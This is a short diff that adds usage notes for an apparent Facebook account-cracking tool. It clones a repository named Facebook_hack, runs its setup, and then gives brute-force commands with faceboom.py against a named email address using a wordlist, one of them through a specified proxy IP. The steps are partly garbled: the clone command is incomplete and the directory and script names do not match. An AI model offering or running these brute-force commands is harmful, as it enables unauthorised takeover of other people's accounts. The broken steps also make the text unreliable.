@@ -1,0 +1,26 @@
+apt update && apt upgrade -y
+
+apt install git -y
+
+https://github.com/hackerxphantom/Facebook_hack.git
+
+cd Facebook hack
+
+bash setup
+
+python facebook_hack.py
+
+
+Target: command 
+
+
+Brute Force On Facebook Account Without proxy:
+
+Command: python faceboom.py -t
+
+Oseid@gmail.com -w wlist.txt
+
+
+Command: python faceboom.py -t
+
+Oseid@gmail.com -w wlist.txt -p 144.217.101.245:3129
